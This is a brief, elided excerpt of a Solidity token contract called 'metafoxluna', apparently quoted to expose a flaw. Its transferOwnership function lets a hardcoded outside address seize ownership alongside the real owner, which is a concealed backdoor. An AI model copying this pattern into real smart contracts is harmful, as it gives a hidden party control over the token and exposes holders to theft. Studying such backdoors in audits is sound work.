...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x32c3A40b1D9BD4A1F041F6A4bb5526494ecf0681));
...
contract metafoxluna1 is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "metafoxluna";
